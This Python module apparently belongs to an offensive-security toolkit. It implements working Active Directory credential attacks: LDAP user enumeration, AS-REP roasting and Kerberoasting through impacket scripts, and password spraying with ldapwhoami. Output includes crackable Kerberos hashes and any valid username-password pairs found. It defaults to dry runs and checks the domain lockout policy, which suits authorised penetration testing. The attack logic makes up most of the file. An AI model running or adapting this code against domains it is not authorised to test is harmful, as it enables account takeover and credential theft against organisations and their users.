# Active Directory credential attacks (#91), scoped and lockout-aware.
#
# The dangerous part of AD password work is not the tooling, it is the account
# lockout policy. A spray that ignores `lockoutThreshold` locks the helpdesk out
# of the domain and is indistinguishable from a denial-of-service. This module
# therefore reads the domain policy first, computes how many attempts a user can
# absorb, and refuses a plan that would exceed it unless the operator explicitly
# forces it. Nothing runs unless the caller asks for execution; every function
# defaults to a dry-run plan.
#
# The primitives are the standard, auditable ones: ldapsearch/ldapwhoami for
# binds and queries, impacket's GetNPUsers.py for AS-REP roasting and
# GetUserSPNs.py for Kerberoasting. Passwords are passed through a 0600 temp
# file (-y), never argv, so they do not appear in the process list.
import base64
import logging
import os
import random
import re
import subprocess  # nosec B404 - fixed argv, no shell
import tempfile
import time
from collections.abc import Callable, Iterator
from contextlib import contextmanager, suppress
from dataclasses import dataclass, field
from typing import Any

logger = logging.getLogger("h4k.ad_attacks")

Runner = Callable[[list[str], float], dict[str, Any]]

MAX_USERS = 500
MAX_PASSWORDS = 10
MIN_DELAY = 0.0
DEFAULT_DELAY = 1.5

LDIF_ATTRS = [
    "sAMAccountName",
    "userAccountControl",
    "servicePrincipalName",
    "pwdLastSet",
    "adminCount",
    "memberOf",
    "distinguishedName",
]

POLICY_ATTRS = [
    "minPwdLength",
    "pwdProperties",
    "pwdHistoryLength",
    "lockoutThreshold",
    "lockoutDuration",
    "lockoutObservationWindow",
    "maxPwdAge",
    "ms-DS-MachineAccountQuota",
]


def _subprocess_runner(argv: list[str], timeout: float) -> dict[str, Any]:
    try:
        proc = subprocess.run(  # nosec B603 - fixed argv, no shell
            argv,
            capture_output=True,
            text=True,
            timeout=timeout,
            check=False,
        )
        return {
            "rc": proc.returncode,
            "stdout": proc.stdout or "",
            "stderr": proc.stderr or "",
            "ok": proc.returncode == 0,
            "timed_out": False,
        }
    except subprocess.TimeoutExpired as exc:
        return {
            "rc": None,
            "stdout": _text(exc.stdout),
            "stderr": _text(exc.stderr),
            "ok": False,
            "timed_out": True,
        }
    except FileNotFoundError as exc:
        return {
            "rc": -1,
            "stdout": "",
            "stderr": f"{exc.filename} not installed",
            "ok": False,
            "timed_out": False,
        }
    except OSError as exc:  # pragma: no cover - defensive
        return {
            "rc": -1,
            "stdout": "",
            "stderr": str(exc),
            "ok": False,
            "timed_out": False,
        }


def _text(value: Any) -> str:
    if value is None:
        return ""
    return (
        value.decode("utf-8", errors="replace")
        if isinstance(value, bytes)
        else str(value)
    )


@contextmanager
def _password_file(password: str) -> Iterator[str]:
    """Give ldap tools the password via a 0600 file instead of argv."""
    handle, path = tempfile.mkstemp(prefix="h4k-pw-", suffix=".txt")
    try:
        os.fchmod(handle, 0o600)
        with os.fdopen(handle, "w", encoding="utf-8") as fh:
            fh.write(password)
        yield path
    finally:
        with suppress(OSError):
            os.unlink(path)


def parse_ldif(text: str) -> list[dict[str, Any]]:
    """Parse the subset of LDIF ldapsearch emits (base64 + folded lines)."""
    entries: list[dict[str, Any]] = []
    current: dict[str, Any] = {}
    last_key = ""
    for raw in text.splitlines():
        if not raw.strip():
            if current and (set(current) - {"dn"}):
                entries.append(current)
            current = {}
            last_key = ""
            continue
        if raw.startswith("#") or raw.lower().startswith(
            (
                "ref:",
                "search:",
                "result:",
                "numresponses:",
                "numentries:",
                "numreferences:",
            )
        ):
            continue
        if raw.startswith("dn:"):
            if current and (set(current) - {"dn"}):
                entries.append(current)
            current = {"dn": raw[3:].strip()}
            last_key = ""
            continue
        if raw.startswith(" ") and last_key:
            current[last_key] = str(current[last_key]) + raw.strip()
            continue
        name, sep, value = raw.partition(":")
        if not sep:
            continue
        name = name.strip()
        value = value.strip()
        if value.startswith(":"):
            try:
                decoded = base64.b64decode(value[1:].strip()).decode(
                    "utf-8", errors="replace"
                )
            except (ValueError, UnicodeDecodeError):
                decoded = value[1:].strip()
        else:
            decoded = value
        if name in current:
            existing = current[name]
            current[name] = (
                [*existing, decoded]
                if isinstance(existing, list)
                else [existing, decoded]
            )
        else:
            current[name] = decoded
        last_key = name
    if current and (set(current) - {"dn"}):
        entries.append(current)
    return entries


def _as_list(value: Any) -> list[str]:
    if value is None:
        return []
    if isinstance(value, list):
        return [str(v) for v in value]
    return [str(value)]


def _int(value: Any, default: int = 0) -> int:
    try:
        return int(str(value).strip())
    except (TypeError, ValueError):
        return default


def _duration_minutes(raw: Any) -> int | None:
    """AD stores durations as negative 100-ns intervals."""
    value = _int(raw, 0)
    if value == 0:
        return 0
    return int(abs(value) / 10_000_000 / 60)


HASH_PATTERNS = {
    "asrep": re.compile(r"\$krb5asrep\$\d+\$[^\s]+", re.M),
    "kerberoast": re.compile(r"\$krb5tgs\$\d+\$[^\s]+", re.M),
}


@dataclass
class ADTarget:
    domain: str
    dc_ip: str
    username: str = ""
    password: str = ""
    base_dn: str = ""
    timeout: float = 60.0
    notes: list[str] = field(default_factory=list)

    def __post_init__(self) -> None:
        self.domain = self.domain.strip().strip(".")
        self.dc_ip = self.dc_ip.strip()
        if not self.base_dn and self.domain:
            self.base_dn = ",".join(f"DC={part}" for part in self.domain.split("."))
        if not self.domain or not self.dc_ip:
            raise ValueError("domain and dc_ip are required")

    def upn(self) -> str:
        user = self.username
        if not user:
            return ""
        return user if "@" in user or "\\" in user else f"{user}@{self.domain}"


class ADCredentialAttacks:
    """Lockout-aware AD credential operations with a dry-run default."""

    def __init__(self, runner: Runner | None = None) -> None:
        self._runner = runner or _subprocess_runner

    def _run(self, argv: list[str], timeout: float | None = None) -> dict[str, Any]:
        logger.info("[ad] run %s", " ".join(argv[:6]))
        return self._runner(argv, float(timeout or 60.0))

    # -- LDAP ---------------------------------------------------------------
    def ldapsearch(
        self,
        target: ADTarget,
        filt: str,
        attrs: list[str],
        *,
        base: str | None = None,
        scope: str = "sub",
        size_limit: int = 1000,
    ) -> dict[str, Any]:
        argv = [
            "ldapsearch",
            "-H",
            f"ldap://{target.dc_ip}",
            "-x",
            "-D",
            target.upn(),
            "-b",
            base or target.base_dn,
            "-s",
            scope,
            "-z",
            str(size_limit),
        ]
        if target.password:
            with _password_file(target.password) as path:
                return self._run([*argv, "-y", path, filt, *attrs], target.timeout)
        return self._run([*argv, "-w", "", filt, *attrs], target.timeout)

    def password_policy(self, target: ADTarget) -> dict[str, Any]:
        result = self.ldapsearch(
            target,
            "(objectClass=domainDNS)",
            POLICY_ATTRS,
            scope="base",
        )
        entries = parse_ldif(result.get("stdout", ""))
        if not entries:
            return {
                "ok": False,
                "error": result.get("stderr") or "could not read domain policy",
                "policy": {},
                "spray_safe": False,
            }
        row = entries[0]
        threshold = _int(row.get("lockoutThreshold"), 0)
        policy = {
            "min_password_length": _int(row.get("minPwdLength")),
            "password_complexity": bool(_int(row.get("pwdProperties")) & 1),
            "history_length": _int(row.get("pwdHistoryLength")),
            "lockout_threshold": threshold,
            "lockout_duration_minutes": _duration_minutes(row.get("lockoutDuration")),
            "lockout_observation_minutes": _duration_minutes(
                row.get("lockoutObservationWindow")
            ),
            "max_password_age_minutes": _duration_minutes(row.get("maxPwdAge")),
            "machine_account_quota": _int(row.get("ms-DS-MachineAccountQuota"), 0),
        }
        return {
            "ok": True,
            "policy": policy,
            "spray_safe": threshold == 0 or threshold > 3,
            "attempts_per_user": 0 if threshold == 0 else max(1, threshold - 1),
            "raw": row,
        }

    def users(self, target: ADTarget, *, limit: int = MAX_USERS) -> dict[str, Any]:
        result = self.ldapsearch(
            target,
            "(&(objectClass=user)(objectCategory=person))",
            LDIF_ATTRS,
            size_limit=min(max(1, limit), MAX_USERS),
        )
        entries = parse_ldif(result.get("stdout", ""))
        rows = []
        for entry in entries:
            uac = _int(entry.get("userAccountControl"))
            rows.append(
                {
                    "user": str(entry.get("sAMAccountName") or ""),
                    "dn": str(entry.get("dn") or ""),
                    "enabled": not bool(uac & 0x0002),
                    "password_never_expires": bool(uac & 0x10000),
                    "kerberoastable": bool(_as_list(entry.get("servicePrincipalName"))),
                    "admin_count": _int(entry.get("adminCount")),
                    "member_of": _as_list(entry.get("memberOf")),
                    "pwd_last_set": _int(entry.get("pwdLastSet")),
                }
            )
        rows = [r for r in rows if r["user"]]
        return {
            "ok": bool(rows) or result.get("rc") == 0,
            "count": len(rows),
            "users": rows,
            "error": "" if rows else (result.get("stderr") or ""),
        }

    # -- roasting -----------------------------------------------------------
    def asrep_roast(
        self,
        target: ADTarget,
        users: list[str] | None = None,
        *,
        execute: bool = False,
    ) -> dict[str, Any]:
        names = [u for u in (users or []) if u]
        if not names:
            found = self.users(target)
            names = [u["user"] for u in found.get("users", [])]
        names = names[:MAX_USERS]
        if not execute:
            return {
                "executed": False,
                "plan": {
                    "tool": "GetNPUsers.py",
                    "domain": target.domain,
                    "dc_ip": target.dc_ip,
                    "candidates": names[:25],
                    "candidate_count": len(names),
                    "writes": "hashes only; no authentication attempts against locked accounts",
                },
            }
        if not names:
            return {"executed": False, "error": "no candidate users"}
        with tempfile.NamedTemporaryFile(
            "w", suffix=".txt", delete=False, encoding="utf-8"
        ) as fh:
            users_path = fh.name
            fh.write("\n".join(names))
        out_path = users_path + ".hashes"
        try:
            result = self._run(
                [
                    "GetNPUsers.py",
                    f"{target.domain}/",
                    "-dc-ip",
                    target.dc_ip,
                    "-usersfile",
                    users_path,
                    "-format",
                    "hashcat",
                    "-no-pass",
                    "-outputfile",
                    out_path,
                ],
                target.timeout * 4,
            )
            output = result.get("stdout", "") + "\n"
            try:
                with open(out_path, encoding="utf-8", errors="replace") as fh:
                    output += fh.read()
            except OSError:
                pass
            hashes = HASH_PATTERNS["asrep"].findall(output)
            return {
                "executed": True,
                "ok": bool(hashes),
                "candidates": len(names),
                "hashes": hashes,
                "hash_count": len(hashes),
                "stdout": result.get("stdout", "")[-4000:],
                "stderr": result.get("stderr", "")[-2000:],
                "rc": result.get("rc"),
            }
        finally:
            for path in (users_path, out_path):
                with suppress(OSError):
                    os.unlink(path)

    def kerberoast(self, target: ADTarget, *, execute: bool = False) -> dict[str, Any]:
        if not target.username or not target.password:
            return {
                "executed": False,
                "error": "kerberoasting needs a domain username and password",
            }
        if not execute:
            return {
                "executed": False,
                "plan": {
                    "tool": "GetUserSPNs.py",
                    "identity": target.upn(),
                    "dc_ip": target.dc_ip,
                    "action": "request TGS tickets for accounts with an SPN",
                },
            }
        out_path = tempfile.mkstemp(prefix="h4k-kerb-", suffix=".hashes")[1]
        try:
            result = self._run(
                [
                    "GetUserSPNs.py",
                    f"{target.domain}/{target.upn()}",
                    "-dc-ip",
                    target.dc_ip,
                    "-request",
                    "-outputfile",
                    out_path,
                ],
                target.timeout * 4,
            )
            output = result.get("stdout", "") + "\n"
            try:
                with open(out_path, encoding="utf-8", errors="replace") as fh:
                    output += fh.read()
            except OSError:
                pass
            hashes = HASH_PATTERNS["kerberoast"].findall(output)
            return {
                "executed": True,
                "ok": bool(hashes),
                "hashes": hashes,
                "hash_count": len(hashes),
                "stdout": result.get("stdout", "")[-4000:],
                "stderr": result.get("stderr", "")[-2000:],
                "rc": result.get("rc"),
            }
        finally:
            with suppress(OSError):
                os.unlink(out_path)

    # -- spraying -----------------------------------------------------------
    def spray(
        self,
        target: ADTarget,
        users: list[str],
        passwords: list[str],
        *,
        execute: bool = False,
        delay: float = DEFAULT_DELAY,
        force: bool = False,
        stop_on_success: bool = False,
        max_users: int = MAX_USERS,
        max_passwords: int = MAX_PASSWORDS,
        policy: dict[str, Any] | None = None,
    ) -> dict[str, Any]:
        user_list = [u.strip() for u in users if u and u.strip()][:max_users]
        password_list = [p for p in passwords if p][:max_passwords]
        if not user_list or not password_list:
            return {"executed": False, "error": "users and passwords are required"}
        delay = max(MIN_DELAY, min(float(delay), 60.0))
        policy_info = policy or self.password_policy(target).get("policy", {})
        threshold = _int(policy_info.get("lockout_threshold"), 0)
        safe_rounds = 0 if threshold == 0 else max(0, threshold - 1)
        if threshold and len(password_list) > safe_rounds and not force:
            return {
                "executed": False,
                "refused": True,
                "reason": (
                    f"lockoutThreshold={threshold}; {len(password_list)} password "
                    f"round(s) would exceed the {safe_rounds} safe attempt(s) per "
                    "user. Reduce the password list or pass force=true."
                ),
                "policy": policy_info,
            }
        plan = {
            "domain": target.domain,
            "dc_ip": target.dc_ip,
            "users": len(user_list),
            "passwords": len(password_list),
            "attempts": len(user_list) * len(password_list),
            "delay_s": delay,
            "lockout_threshold": threshold,
            "safe_rounds": safe_rounds,
            "one_attempt_per_round": True,
        }
        if not execute:
            return {
                "executed": False,
                "plan": plan,
                "policy": policy_info,
                "warning": (
                    "dry run: pass execute=true to authenticate. A spray can lock "
                    "accounts; this plan is bounded by the domain policy."
                ),
            }
        attempts: list[dict[str, Any]] = []
        found: list[dict[str, Any]] = []
        for password in password_list:
            for user in user_list:
                with _password_file(password) as path:
                    result = self._run(
                        [
                            "ldapwhoami",
                            "-H",
                            f"ldap://{target.dc_ip}",
                            "-x",
                            "-D",
                            f"{user}@{target.domain}",
                            "-y",
                            path,
                        ],
                        target.timeout,
                    )
                ok = bool(result.get("ok"))
                attempts.append(
                    {
                        "user": user,
                        "password_length": len(password),
                        "ok": ok,
                        "rc": result.get("rc"),
                    }
                )
                if ok:
                    found.append({"user": user, "password": password})
                    logger.warning("[ad] spray success: %s@%s", user, target.domain)
                if stop_on_success and found:
                    break
                if delay:
                    time.sleep(
                        delay
                        + random.uniform(0, delay / 3)  # nosec B311 - timing jitter
                    )  # nosec B311 - timing jitter
            if stop_on_success and found:
                break
        return {
            "executed": True,
            "ok": bool(found),
            "plan": plan,
            "policy": policy_info,
            "found": found,
            "attempts": attempts,
            "attempt_count": len(attempts),
        }


def password_policy(target: ADTarget, **kwargs: Any) -> dict[str, Any]:
    runner = kwargs.pop("runner", None)
    return ADCredentialAttacks(runner).password_policy(target)


def spray(
    target: ADTarget, users: list[str], passwords: list[str], **kwargs: Any
) -> dict[str, Any]:
    runner = kwargs.pop("runner", None)
    return ADCredentialAttacks(runner).spray(target, users, passwords, **kwargs)


def asrep_roast(
    target: ADTarget, users: list[str] | None = None, **kwargs: Any
) -> dict[str, Any]:
    runner = kwargs.pop("runner", None)
    return ADCredentialAttacks(runner).asrep_roast(target, users, **kwargs)


def kerberoast(target: ADTarget, **kwargs: Any) -> dict[str, Any]:
    runner = kwargs.pop("runner", None)
    return ADCredentialAttacks(runner).kerberoast(target, **kwargs)
